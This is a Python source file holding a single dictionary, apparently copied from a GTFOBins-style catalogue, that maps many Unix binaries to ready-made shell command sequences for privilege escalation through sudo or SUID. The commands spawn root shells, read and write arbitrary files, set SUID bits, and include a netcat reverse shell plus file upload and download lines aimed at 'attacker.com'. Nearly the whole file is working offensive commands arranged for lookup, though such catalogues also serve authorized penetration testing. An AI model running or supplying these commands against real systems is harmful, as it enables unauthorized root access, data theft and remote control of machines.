database_dict = {
    '7z': [['LFILE=file_to_read', 'sudo 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so'], []],
    'ab': [['URL=http://attacker.com/', 'LFILE=file_to_send', 'sudo ab -p $LFILE $URL'],
           ['URL=http://attacker.com/', 'LFILE=file_to_send', './ab -p $LFILE $URL']],
    'agetty': [[], ['./agetty -o -p -l /bin/sh -a root tty']],
    'alpine': [['LFILE=file_to_read', 'sudo alpine -F "$LFILE"'],
               ['LFILE=file_to_read', './alpine -F "$LFILE"']], 'ansible-playbook': [
        ['TF=$(mktemp)', "echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF",
         'sudo ansible-playbook $TF'], []], 'aoss': [['sudo aoss /bin/sh'], []],
    'apt': [['sudo apt changelog apt', '!/bin/sh'], []],
    'apt-get': [['sudo apt-get changelog apt', '!/bin/sh'], []],
    'ar': [['TF=$(mktemp -u)', 'LFILE=file_to_read', 'sudo ar r "$TF" "$LFILE"', 'cat "$TF"'],
           ['TF=$(mktemp -u)', 'LFILE=file_to_read', './ar r "$TF" "$LFILE"', 'cat "$TF"']], 'aria2c': [
        ["COMMAND='id'", 'TF=$(mktemp)', 'echo "$COMMAND" > $TF', 'chmod +x $TF',
         'sudo aria2c --on-download-error=$TF http://x'], []], 'arj': [
        ['TF=$(mktemp -d)', 'LFILE=file_to_write', 'LDIR=where_to_write', 'echo DATA >"$TF/$LFILE"',
         'arj a "$TF/a" "$TF/$LFILE"', 'sudo arj e "$TF/a" $LDIR'],
        ['TF=$(mktemp -d)', 'LFILE=file_to_write', 'LDIR=where_to_write', 'echo DATA >"$TF/$LFILE"',
         'arj a "$TF/a" "$TF/$LFILE"', './arj e "$TF/a" $LDIR']],
    'arp': [['LFILE=file_to_read', 'sudo arp -v -f "$LFILE"'],
            ['LFILE=file_to_read', './arp -v -f "$LFILE"']],
    'as': [['LFILE=file_to_read', 'sudo as @$LFILE'], ['LFILE=file_to_read', './as @$LFILE']],
    'ascii-xfr': [['LFILE=file_to_read', 'sudo ascii-xfr -ns "$LFILE"'],
                  ['LFILE=file_to_read', './ascii-xfr -ns "$LFILE"']],
    'ascii85': [['LFILE=file_to_read', 'sudo ascii85 "$LFILE" | ascii85 --decode'], []],
    'ash': [['sudo ash'], ['./ash']], 'aspell': [['LFILE=file_to_read', 'sudo aspell -c "$LFILE"'],
                                                 ['LFILE=file_to_read', './aspell -c "$LFILE"']],
    'at': [['echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | sudo at now; tail -f /dev/null'], []],
    'atobm': [['LFILE=file_to_read', 'sudo atobm $LFILE 2>&1 | awk -F "\'" \'{printf "%s", $2}\''],
              ['LFILE=file_to_read', './atobm $LFILE 2>&1 | awk -F "\'" \'{printf "%s", $2}\'']],
    'awk': [['sudo awk \'BEGIN {system("/bin/sh")}\''], ['LFILE=file_to_read', './awk \'//\' "$LFILE"']],
    'aws': [['sudo aws help', '!/bin/sh'], []],
    'base32': [['LFILE=file_to_read', 'sudo base32 "$LFILE" | base32 --decode'],
               ['LFILE=file_to_read', 'base32 "$LFILE" | base32 --decode']],
    'base58': [['LFILE=file_to_read', 'sudo base58 "$LFILE" | base58 --decode'], []],
    'base64': [['LFILE=file_to_read', 'sudo base64 "$LFILE" | base64 --decode'],
               ['LFILE=file_to_read', './base64 "$LFILE" | base64 --decode']],
    'basenc': [['LFILE=file_to_read', 'sudo basenc --base64 $LFILE | basenc -d --base64'],
               ['LFILE=file_to_read', 'basenc --base64 $LFILE | basenc -d --base64']],
    'basez': [['LFILE=file_to_read', 'sudo basez "$LFILE" | basez --decode'],
              ['LFILE=file_to_read', './basez "$LFILE" | basez --decode']],
    'bash': [['sudo bash'], ['./bash -p']],
    'batcat': [['sudo batcat --paging always /etc/profile', '!/bin/sh'], []],
    'bc': [['LFILE=file_to_read', 'sudo bc -s $LFILE', 'quit'],
           ['LFILE=file_to_read', './bc -s $LFILE', 'quit']],
    'bconsole': [['sudo bconsole', '@exec /bin/sh'], []],
    'bpftrace': [['sudo bpftrace -e \'BEGIN {system("/bin/sh");exit()}\''], []],
    'bridge': [['LFILE=file_to_read', 'sudo bridge -b "$LFILE"'],
               ['LFILE=file_to_read', './bridge -b "$LFILE"']],
    'bundle': [['sudo bundle help', '!/bin/sh'], []], 'bundler': [['sudo bundler help', '!/bin/sh'], []],
    'busctl': [['sudo busctl --show-machine', '!/bin/sh'], []],
    'busybox': [['sudo busybox sh'], ['./busybox sh']],
    'byebug': [['TF=$(mktemp)', 'echo \'system("/bin/sh")\' > $TF', 'sudo byebug $TF', 'continue'], []],
    'bzip2': [['LFILE=file_to_read', 'sudo bzip2 -c $LFILE | bzip2 -d'],
              ['LFILE=file_to_read', './bzip2 -c $LFILE | bzip2 -d']],
    'c89': [['sudo c89 -wrapper /bin/sh,-s .'], []], 'c99': [['sudo c99 -wrapper /bin/sh,-s .'], []],
    'cabal': [['sudo cabal exec -- /bin/sh'], ['./cabal exec -- /bin/sh -p']],
    'capsh': [['sudo capsh --'], ['./capsh --gid=0 --uid=0 --']],
    'cat': [['LFILE=file_to_read', 'sudo cat "$LFILE"'], ['LFILE=file_to_read', './cat "$LFILE"']],
    'cdist': [['sudo cdist shell -s /bin/sh'], []], 'certbot': [['TF=$(mktemp -d)',
                                                                 "sudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'"],
                                                                []], 'check_by_ssh': [
        ['sudo check_by_ssh -o "ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)" -H localhost -C xx'], []],
    'check_cups': [['LFILE=file_to_read', 'sudo check_cups --extra-opts=@$LFILE'], []],
    'check_log': [['LFILE=file_to_write', 'INPUT=input_file', 'sudo check_log -F $INPUT -O $LFILE'], []],
    'check_memory': [['LFILE=file_to_read', 'sudo check_memory --extra-opts=@$LFILE'], []],
    'check_raid': [['LFILE=file_to_read', 'sudo check_raid --extra-opts=@$LFILE'], []], 'check_ssl_cert': [
        ['COMMAND=id', 'OUTPUT=output_file', 'TF=$(mktemp)', 'echo "$COMMAND | tee $OUTPUT" > $TF', 'chmod +x $TF',
         'umask 022', 'check_ssl_cert --curl-bin $TF -H example.net', 'cat $OUTPUT'], []],
    'check_statusfile': [['LFILE=file_to_read', 'sudo check_statusfile $LFILE'], []],
    'chmod': [['LFILE=file_to_change', 'sudo chmod 6777 $LFILE'],
              ['LFILE=file_to_change', './chmod 6777 $LFILE']],
    'choom': [['sudo choom -n 0 /bin/sh'], ['./choom -n 0 -- /bin/sh -p']],
    'chown': [['LFILE=file_to_change', 'sudo chown $(id -un):$(id -gn) $LFILE'],
              ['LFILE=file_to_change', './chown $(id -un):$(id -gn) $LFILE']],
    'chroot': [['sudo chroot /'], ['./chroot / /bin/sh -p']],
    'cmp': [['LFILE=file_to_read', 'sudo cmp $LFILE /dev/zero -b -l'],
            ['LFILE=file_to_read', './cmp $LFILE /dev/zero -b -l']], 'cobc': [
        ['TF=$(mktemp -d)', 'echo \'CALL "SYSTEM" USING "/bin/sh".\' > $TF/x',
         'sudo cobc -xFj --frelax-syntax-checks $TF/x'], []],
    'column': [['LFILE=file_to_read', 'sudo column $LFILE'], ['LFILE=file_to_read', './column $LFILE']],
    'comm': [['LFILE=file_to_read', 'sudo comm $LFILE /dev/null 2>/dev/null'],
             ['LFILE=file_to_read', 'comm $LFILE /dev/null 2>/dev/null']], 'composer': [
        ['TF=$(mktemp -d)', 'echo \'{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}\' >$TF/composer.json',
         'sudo composer --working-dir=$TF run-script x'], []],
    'cowsay': [['TF=$(mktemp)', 'echo \'exec "/bin/sh";\' >$TF', 'sudo cowsay -f $TF x'], []],
    'cowthink': [['TF=$(mktemp)', 'echo \'exec "/bin/sh";\' >$TF', 'sudo cowthink -f $TF x'], []],
    'cp': [['LFILE=file_to_write', 'echo "DATA" | sudo cp /dev/stdin "$LFILE"'],
           ['LFILE=file_to_write', 'echo "DATA" | ./cp /dev/stdin "$LFILE"']],
    'cpan': [['sudo cpan', "! exec '/bin/bash'"], []], 'cpio': [
        ["echo '/bin/sh </dev/tty >/dev/tty' >localhost", 'sudo cpio -o --rsh-command /bin/sh -F localhost:'],
        ['LFILE=file_to_read', 'TF=$(mktemp -d)', 'echo "$LFILE" | ./cpio -R $UID -dp $TF', 'cat "$TF/$LFILE"']],
    'cpulimit': [['sudo cpulimit -l 100 -f /bin/sh'], ['./cpulimit -l 100 -f -- /bin/sh -p']],
    'crash': [['sudo crash -h', '!sh'], []], 'crontab': [['sudo crontab -e'], []],
    'csh': [['sudo csh'], ['./csh -b']],
    'csplit': [['LFILE=file_to_read', 'sudo csplit $LFILE 1', 'cat xx01'],
               ['LFILE=file_to_read', 'csplit $LFILE 1', 'cat xx01']],
    'csvtool': [["sudo csvtool call '/bin/sh;false' /etc/passwd"],
                ['LFILE=file_to_read', './csvtool trim t $LFILE']], 'cupsfilter': [
        ['LFILE=file_to_read', 'sudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE'],
        ['LFILE=file_to_read', './cupsfilter -i application/octet-stream -m application/octet-stream $LFILE']],
    'curl': [['URL=http://attacker.com/file_to_get', 'LFILE=file_to_save', 'sudo curl $URL -o $LFILE'],
             ['URL=http://attacker.com/file_to_get', 'LFILE=file_to_save', './curl $URL -o $LFILE']],
    'cut': [['LFILE=file_to_read', 'sudo cut -d "" -f1 "$LFILE"'],
            ['LFILE=file_to_read', './cut -d "" -f1 "$LFILE"']], 'dash': [['sudo dash'], ['./dash -p']],
    'date': [['LFILE=file_to_read', 'sudo date -f $LFILE'], ['LFILE=file_to_read', './date -f $LFILE']],
    'dd': [['LFILE=file_to_write', 'echo "data" | sudo dd of=$LFILE'],
           ['LFILE=file_to_write', 'echo "data" | ./dd of=$LFILE']],
    'debugfs': [['sudo debugfs', '!/bin/sh'], ['./debugfs', '!/bin/sh']],
    'dialog': [['LFILE=file_to_read', 'sudo dialog --textbox "$LFILE" 0 0'],
               ['LFILE=file_to_read', './dialog --textbox "$LFILE" 0 0']],
    'diff': [['LFILE=file_to_read', 'sudo diff --line-format=%L /dev/null $LFILE'],
             ['LFILE=file_to_read', './diff --line-format=%L /dev/null $LFILE']],
    'dig': [['LFILE=file_to_read', 'sudo dig -f $LFILE'], ['LFILE=file_to_read', './dig -f $LFILE']],
    'distcc': [['sudo distcc /bin/sh'], ['./distcc /bin/sh -p']],
    'dmesg': [['sudo dmesg -H', '!/bin/sh'], []],
    'dmidecode': [['make dmiwrite', 'TF=$(mktemp)', 'echo "DATA" > $TF', './dmiwrite $TF x.dmi', ''], []],
    'dmsetup': [['sudo dmsetup create base <<EOF', '0 3534848 linear /dev/loop0 94208', 'EOF',
                 "sudo dmsetup ls --exec '/bin/sh -s'"],
                ['./dmsetup create base <<EOF', '0 3534848 linear /dev/loop0 94208', 'EOF',
                 "./dmsetup ls --exec '/bin/sh -p -s'"]], 'dnf': [
        ['TF=$(mktemp -d)', "echo 'id' > $TF/x.sh", 'fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF', ''],
        []], 'docker': [['sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh'],
                        ['./docker run -v /:/mnt --rm -it alpine chroot /mnt sh']], 'dosbox': [
        ["LFILE='\\path\\to\\file_to_write'", 'sudo dosbox -c \'mount c /\' -c "echo DATA >c:$LFILE" -c exit'],
        ["LFILE='\\path\\to\\file_to_write'", './dosbox -c \'mount c /\' -c "echo DATA >c:$LFILE" -c exit']],
    'dpkg': [['sudo dpkg -l', '!/bin/sh'], []], 'dstat': [
        ['echo \'import os; os.execv("/bin/sh", ["sh"])\' >/usr/local/share/dstat/dstat_xxx.py', 'sudo dstat --xxx'],
        []], 'dvips': [['tex \'\\special{psfile="`/bin/sh 1>&0"}\\end\'', 'sudo dvips -R0 texput.dvi'], []],
    'easy_install': [['TF=$(mktemp -d)',
                      'echo "import os; os.execl(\'/bin/sh\', \'sh\', \'-c\', \'sh <$(tty) >$(tty) 2>$(tty)\')" > $TF/setup.py',
                      'sudo easy_install $TF'], []], 'eb': [['sudo eb logs', '!/bin/sh'], []],
    'ed': [['sudo ed', '!/bin/sh'], ['./ed file_to_read', ',p', 'q']],
    'efax': [['LFILE=file_to_read', 'sudo efax -d "$LFILE"'],
             ['LFILE=file_to_read', './efax -d "$LFILE"']],
    'emacs': [['sudo emacs -Q -nw --eval \'(term "/bin/sh")\''],
              ['./emacs -Q -nw --eval \'(term "/bin/sh -p")\'']],
    'env': [['sudo env /bin/sh'], ['./env /bin/sh -p']],
    'eqn': [['LFILE=file_to_read', 'sudo eqn "$LFILE"'], ['LFILE=file_to_read', './eqn "$LFILE"']],
    'espeak': [['LFILE=file_to_read', 'sudo espeak -qXf "$LFILE"'],
               ['LFILE=file_to_read', './espeak -qXf "$LFILE"']], 'ex': [['sudo ex', '!/bin/sh'], []],
    'exiftool': [['LFILE=file_to_write', 'INPUT=input_file', 'sudo exiftool -filename=$LFILE $INPUT'], []],
    'expand': [['LFILE=file_to_read', 'sudo expand "$LFILE"'],
               ['LFILE=file_to_read', './expand "$LFILE"']],
    'expect': [["sudo expect -c 'spawn /bin/sh;interact'"], ["./expect -c 'spawn /bin/sh -p;interact'"]],
    'facter': [['TF=$(mktemp -d)', 'echo \'exec("/bin/sh")\' > $TF/x.rb', 'sudo FACTERLIB=$TF facter'],
               []],
    'file': [['LFILE=file_to_read', 'sudo file -f $LFILE'], ['LFILE=file_to_read', './file -f $LFILE']],
    'find': [['sudo find . -exec /bin/sh \\; -quit'], ['./find . -exec /bin/sh -p \\; -quit']],
    'fish': [['sudo fish'], ['./fish']],
    'flock': [['sudo flock -u / /bin/sh'], ['./flock -u / /bin/sh -p']],
    'fmt': [['LFILE=file_to_read', 'sudo fmt -999 "$LFILE"'],
            ['LFILE=file_to_read', './fmt -999 "$LFILE"']],
    'fold': [['LFILE=file_to_read', 'sudo fold -w99999999 "$LFILE"'],
             ['LFILE=file_to_read', './fold -w99999999 "$LFILE"']],
    'fping': [['LFILE=file_to_read', 'sudo fping -f $LFILE'], []], 'ftp': [['sudo ftp', '!/bin/sh'], []],
    'gawk': [['sudo gawk \'BEGIN {system("/bin/sh")}\''],
             ['LFILE=file_to_read', './gawk \'//\' "$LFILE"']],
    'gcc': [['sudo gcc -wrapper /bin/sh,-s .'], []], 'gcloud': [['sudo gcloud help', '!/bin/sh'], []],
    'gcore': [['sudo gcore $PID'], ['./gcore $PID']], 'gdb': [["sudo gdb -nx -ex '!sh' -ex quit"], [
        './gdb -nx -ex \'python import os; os.execl("/bin/sh", "sh", "-p")\' -ex quit']],
    'gem': [['sudo gem open -e "/bin/sh -c /bin/sh" rdoc'], []],
    'genie': [["sudo genie -c '/bin/sh'"], ["./genie -c '/bin/sh'"]],
    'genisoimage': [['LFILE=file_to_read', 'sudo genisoimage -q -o - "$LFILE"'],
                    ['LFILE=file_to_read', './genisoimage -sort "$LFILE"']],
    'ghc': [['sudo ghc -e \'System.Process.callCommand "/bin/sh"\''], []],
    'ghci': [['sudo ghci', 'System.Process.callCommand "/bin/sh"'], []],
    'gimp': [['sudo gimp -idf --batch-interpreter=python-fu-eval -b \'import os; os.system("sh")\''], [
        './gimp -idf --batch-interpreter=python-fu-eval -b \'import os; os.execl("/bin/sh", "sh", "-p")\'']],
    'ginsh': [['sudo ginsh', '!/bin/sh'], []],
    'git': [['sudo PAGER=\'sh -c "exec sh 0<&1"\' git -p help'], []],
    'grc': [['sudo grc --pty /bin/sh'], []],
    'grep': [['LFILE=file_to_read', "sudo grep '' $LFILE"], ['LFILE=file_to_read', "./grep '' $LFILE"]],
    'gtester': [
        ['TF=$(mktemp)', "echo '#!/bin/sh' > $TF", "echo 'exec /bin/sh 0<&1' >> $TF", 'chmod +x $TF',
         'sudo gtester -q $TF'],
        ['TF=$(mktemp)', "echo '#!/bin/sh -p' > $TF", "echo 'exec /bin/sh -p 0<&1' >> $TF", 'chmod +x $TF',
         'sudo gtester -q $TF']], 'gzip': [['LFILE=file_to_read', 'sudo gzip -f $LFILE -t'],
                                           ['LFILE=file_to_read', './gzip -f $LFILE -t']],
    'hd': [['LFILE=file_to_read', 'sudo hd "$LFILE"'], ['LFILE=file_to_read', './hd "$LFILE"']],
    'head': [['LFILE=file_to_read', 'sudo head -c1G "$LFILE"'],
             ['LFILE=file_to_read', './head -c1G "$LFILE"']],
    'hexdump': [['LFILE=file_to_read', 'sudo hexdump -C "$LFILE"'],
                ['LFILE=file_to_read', './hexdump -C "$LFILE"']],
    'highlight': [['LFILE=file_to_read', 'sudo highlight --no-doc --failsafe "$LFILE"'],
                  ['LFILE=file_to_read', './highlight --no-doc --failsafe "$LFILE"']],
    'hping3': [['sudo hping3', '/bin/sh'], ['./hping3', '/bin/sh -p']],
    'iconv': [['LFILE=file_to_read', './iconv -f 8859_1 -t 8859_1 "$LFILE"'],
              ['LFILE=file_to_read', './iconv -f 8859_1 -t 8859_1 "$LFILE"']],
    'iftop': [['sudo iftop', '!/bin/sh'], []],
    'install': [['LFILE=file_to_change', 'TF=$(mktemp)', 'sudo install -m 6777 $LFILE $TF'],
                ['LFILE=file_to_change', 'TF=$(mktemp)', './install -m 6777 $LFILE $TF']],
    'ionice': [['sudo ionice /bin/sh'], ['./ionice /bin/sh -p']],
    'ip': [['LFILE=file_to_read', 'sudo ip -force -batch "$LFILE"'],
           ['LFILE=file_to_read', './ip -force -batch "$LFILE"']],
    'irb': [['sudo irb', "exec '/bin/bash'"], []],
    'ispell': [['sudo ispell /etc/passwd', '!/bin/sh'], ['./ispell /etc/passwd', '!/bin/sh -p']], 'jjs': [[
        'echo "Java.type(\'java.lang.Runtime\').getRuntime().exec(\'/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)\').waitFor()" | sudo jjs'],
        [
            'echo "Java.type(\'java.lang.Runtime\').getRuntime().exec(\'/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)\').waitFor()" | ./jjs']],
    'joe': [['sudo joe', '^K!/bin/sh'], []],
    'join': [['LFILE=file_to_read', 'sudo join -a 2 /dev/null $LFILE'],
             ['LFILE=file_to_read', './join -a 2 /dev/null $LFILE']],
    'journalctl': [['sudo journalctl', '!/bin/sh'], []],
    'jq': [['LFILE=file_to_read', 'sudo jq -Rr . "$LFILE"'],
           ['LFILE=file_to_read', './jq -Rr . "$LFILE"']], 'jrunscript': [
        ['sudo jrunscript -e "exec(\'/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)\')"'],
        ['./jrunscript -e "exec(\'/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)\')"']],
    'jtag': [['sudo jtag --interactive', 'shell /bin/sh'], []],
    'knife': [['sudo knife exec -E \'exec "/bin/sh"\''], []], 'ksh': [['sudo ksh'], ['./ksh -p']],
    'ksshell': [['LFILE=file_to_read', 'sudo ksshell -i $LFILE'],
                ['LFILE=file_to_read', './ksshell -i $LFILE']], 'ksu': [['sudo ksu -q -e /bin/sh'], []],
    'kubectl': [['LFILE=dir_to_serve',
                 'sudo kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/'],
                ['LFILE=dir_to_serve',
                 './kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/']],
    'latex': [[
        "sudo latex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'",
        'strings article.dvi'], []], 'latexmk': [['sudo latexmk -e \'exec "/bin/sh";\''], []],
    'ld.so': [['sudo /lib/ld.so /bin/sh'], ['./ld.so /bin/sh -p']], 'ldconfig': [
        ['TF=$(mktemp -d)', 'echo "$TF" > "$TF/conf"', '# move malicious libraries in $TF',
         'sudo ldconfig -f "$TF/conf"'], []], 'less': [['sudo less /etc/profile', '!/bin/sh'], ['./less file_to_read']],
    'lftp': [["sudo lftp -c '!/bin/sh'"], []], 'ln': [['sudo ln -fs /bin/sh /bin/ln', 'sudo ln'], []],
    'loginctl': [['sudo loginctl user-status', '!/bin/sh'], []],
    'logsave': [['sudo logsave /dev/null /bin/sh -i'], ['./logsave /dev/null /bin/sh -i -p']],
    'look': [['LFILE=file_to_read', 'sudo look \'\' "$LFILE"'],
             ['LFILE=file_to_read', './look \'\' "$LFILE"']],
    'ltrace': [['sudo ltrace -b -L /bin/sh'], []], 'lua': [['sudo lua -e \'os.execute("/bin/sh")\''], [
        'lua -e \'local f=io.open("file_to_read", "rb"); print(f:read("*a")); io.close(f);\'']], 'lualatex': [[
        'sudo lualatex -shell-escape \'\\documentclass{article}\\begin{document}\\directlua{os.execute("/bin/sh")}\\end{document}\''],
        []],
    'luatex': [['sudo luatex -shell-escape \'\\directlua{os.execute("/bin/sh")}\\end\''], []],
    'lwp-download': [
        ['URL=http://attacker.com/file_to_get', 'LFILE=file_to_save', 'sudo lwp-download $URL $LFILE'],
        []], 'lwp-request': [['LFILE=file_to_read', 'sudo lwp-request "file://$LFILE"'], []],
    'mail': [["sudo mail --exec='!/bin/sh'"], []],
    'make': [["COMMAND='/bin/sh'", 'sudo make -s --eval=$\'x:\\n\\t-\'"$COMMAND"'],
             ["COMMAND='/bin/sh -p'", './make -s --eval=$\'x:\\n\\t-\'"$COMMAND"']],
    'man': [['sudo man man', '!/bin/sh'], []], 'mawk': [['sudo mawk \'BEGIN {system("/bin/sh")}\''],
                                                        ['LFILE=file_to_read', './mawk \'//\' "$LFILE"']],
    'more': [['TERM= sudo more /etc/profile', '!/bin/sh'], ['./more file_to_read']],
    'mosquitto': [['LFILE=file_to_read', 'sudo mosquitto -c "$LFILE"'],
                  ['LFILE=file_to_read', './mosquitto -c "$LFILE"']],
    'mount': [['sudo mount -o bind /bin/sh /bin/mount', 'sudo mount'], []],
    'msfconsole': [['sudo msfconsole', 'msf6 > irb', '>> system("/bin/sh")'], []],
    'msgattrib': [['LFILE=file_to_read', 'sudo msgattrib -P $LFILE'],
                  ['LFILE=file_to_read', './msgattrib -P $LFILE']],
    'msgcat': [['LFILE=file_to_read', 'sudo msgcat -P $LFILE'],
               ['LFILE=file_to_read', './msgcat -P $LFILE']],
    'msgconv': [['LFILE=file_to_read', 'sudo msgconv -P $LFILE'],
                ['LFILE=file_to_read', './msgconv -P $LFILE']],
    'msgfilter': [["echo x | sudo msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'"],
                  ["echo x | ./msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'"]],
    'msgmerge': [['LFILE=file_to_read', 'sudo msgmerge -P $LFILE /dev/null'],
                 ['LFILE=file_to_read', './msgmerge -P $LFILE /dev/null']],
    'msguniq': [['LFILE=file_to_read', 'sudo msguniq -P $LFILE'],
                ['LFILE=file_to_read', './msguniq -P $LFILE']],
    'mtr': [['LFILE=file_to_read', 'sudo mtr --raw -F "$LFILE"'], []],
    'multitime': [['sudo multitime /bin/sh'], ['./multitime /bin/sh -p']],
    'mv': [['LFILE=file_to_write', 'TF=$(mktemp)', 'echo "DATA" > $TF', 'sudo mv $TF $LFILE'],
           ['LFILE=file_to_write', 'TF=$(mktemp)', 'echo "DATA" > $TF', './mv $TF $LFILE']],
    'mysql': [["sudo mysql -e '\\! /bin/sh'"], []],
    'nano': [['sudo nano', '^R^X', 'reset; sh 1>&0 2>&0'], []],
    'nasm': [['LFILE=file_to_read', 'sudo nasm -@ $LFILE'], ['LFILE=file_to_read', './nasm -@ $LFILE']],
    'nawk': [['sudo nawk \'BEGIN {system("/bin/sh")}\''],
             ['LFILE=file_to_read', './nawk \'//\' "$LFILE"']],
    'nc': [['RHOST=attacker.com', 'RPORT=12345', 'sudo nc -e /bin/sh $RHOST $RPORT'], []],
    'neofetch': [['TF=$(mktemp)', "echo 'exec /bin/sh' >$TF", 'sudo neofetch --config $TF'], []],
    'nft': [['LFILE=file_to_read', 'sudo nft -f "$LFILE"'], ['LFILE=file_to_read', './nft -f "$LFILE"']],
    'nice': [['sudo nice /bin/sh'], ['./nice /bin/sh -p']],
    'nl': [['LFILE=file_to_read', "sudo nl -bn -w1 -s '' $LFILE"],
           ['LFILE=file_to_read', "./nl -bn -w1 -s '' $LFILE"]],
    'nm': [['LFILE=file_to_read', 'sudo nm @$LFILE'], ['LFILE=file_to_read', './nm @$LFILE']],
    'nmap': [['TF=$(mktemp)', 'echo \'os.execute("/bin/sh")\' > $TF', 'sudo nmap --script=$TF'],
             ['LFILE=file_to_write', './nmap -oG=$LFILE DATA']],
    'node': [['sudo node -e \'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})\''],
             ['./node -e \'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})\'']],
    'nohup': [['sudo nohup /bin/sh -c "sh <$(tty) >$(tty) 2>$(tty)"'],
              ['./nohup /bin/sh -p -c "sh -p <$(tty) >$(tty) 2>$(tty)"']], 'npm': [
        ['TF=$(mktemp -d)', 'echo \'{"scripts": {"preinstall": "/bin/sh"}}\' > $TF/package.json',
         'sudo npm -C $TF --unsafe-perm i'], []], 'nroff': [
        ['TF=$(mktemp -d)', "echo '#!/bin/sh' > $TF/groff", "echo '/bin/sh' >> $TF/groff", 'chmod +x $TF/groff',
         'sudo GROFF_BIN_PATH=$TF nroff'], []], 'nsenter': [['sudo nsenter /bin/sh'], []],
    'octave': [['sudo octave-cli --eval \'system("/bin/sh")\''], []],
    'od': [['LFILE=file_to_read', 'sudo od -An -c -w9999 "$LFILE"'],
           ['LFILE=file_to_read', './od -An -c -w9999 "$LFILE"']], 'openssl': [
        ['openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes',
         'openssl s_server -quiet -key key.pem -cert cert.pem -port 12345', ''],
        ['openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes',
         'openssl s_server -quiet -key key.pem -cert cert.pem -port 12345', '']],
    'openvpn': [["sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'"],
                ['./openvpn --dev null --script-security 2 --up \'/bin/sh -p -c "sh -p"\'']],
    'openvt': [['COMMAND=id', 'TF=$(mktemp -u)', 'sudo openvt -- sh -c "$COMMAND >$TF 2>&1"', 'cat $TF'],
               []], 'opkg': [['TF=$(mktemp -d)', "echo 'exec /bin/sh' > $TF/x.sh",
                              'fpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF', ''], []],
    'pandoc': [['LFILE=file_to_write', 'echo DATA | sudo pandoc -t plain -o "$LFILE"'],
               ['LFILE=file_to_write', 'echo DATA | ./pandoc -t plain -o "$LFILE"']],
    'paste': [['LFILE=file_to_read', 'sudo paste $LFILE'], ['LFILE=file_to_read', 'paste $LFILE']],
    'pdb': [['TF=$(mktemp)', 'echo \'import os; os.system("/bin/sh")\' > $TF', 'sudo pdb $TF', 'cont'],
            []], 'pdflatex': [[
        "sudo pdflatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'",
        'pdftotext article.pdf -'], []],
    'pdftex': [["sudo pdftex --shell-escape '\\write18{/bin/sh}\\end'"], []],
    'perf': [['sudo perf stat /bin/sh'], ['./perf stat /bin/sh -p']],
    'perl': [['sudo perl -e \'exec "/bin/sh";\''], ['./perl -e \'exec "/bin/sh";\'']],
    'perlbug': [["sudo perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;'"], []],
    'pexec': [['sudo pexec /bin/sh'], ['./pexec /bin/sh -p']],
    'pg': [['sudo pg /etc/profile', '!/bin/sh'], ['./pg file_to_read']],
    'php': [['sudo php -r "system(\'/bin/sh\');"'],
            ['CMD="/bin/sh"', './php -r "pcntl_exec(\'/bin/sh\', [\'-p\']);"']],
    'pic': [['sudo pic -U', '.PS', 'sh X sh X'], []],
    'pico': [['sudo pico', '^R^X', 'reset; sh 1>&0 2>&0'], []],
    'pidstat': [['COMMAND=id', 'sudo pidstat -e $COMMAND'], ['COMMAND=id', './pidstat -e $COMMAND']],
    'pip': [['TF=$(mktemp -d)',
             'echo "import os; os.execl(\'/bin/sh\', \'sh\', \'-c\', \'sh <$(tty) >$(tty) 2>$(tty)\')" > $TF/setup.py',
             'sudo pip install $TF'], []], 'pkexec': [['sudo pkexec /bin/sh'], []], 'pkg': [
        ['TF=$(mktemp -d)', "echo 'id' > $TF/x.sh", 'fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF',
         ''], []], 'posh': [['sudo posh'], []],
    'pr': [['LFILE=file_to_read', 'pr -T $LFILE'], ['LFILE=file_to_read', 'pr -T $LFILE']],
    'pry': [['sudo pry', 'system("/bin/sh")'], []], 'psftp': [['sudo psftp', '!/bin/sh'], []],
    'psql': [['psql', '\\?', '!/bin/sh'], []], 'ptx': [['LFILE=file_to_read', 'sudo ptx -w 5000 "$LFILE"'],
                                                       ['LFILE=file_to_read', './ptx -w 5000 "$LFILE"']],
    'puppet': [
        ['sudo puppet apply -e "exec { \'/bin/sh -c \\"exec sh -i <$(tty) >$(tty) 2>$(tty)\\"\': }"'], []],
    'python': [['sudo python -c \'import os; os.system("/bin/sh")\''],
               ['./python -c \'import os; os.execl("/bin/sh", "sh", "-p")\'']],
    'rake': [["sudo rake -p '`/bin/sh 1>&0`'"], []],
    'readelf': [['LFILE=file_to_read', 'sudo readelf -a @$LFILE'],
                ['LFILE=file_to_read', './readelf -a @$LFILE']],
    'red': [['sudo red file_to_write', 'a', 'DATA', '.', 'w', 'q'], []],
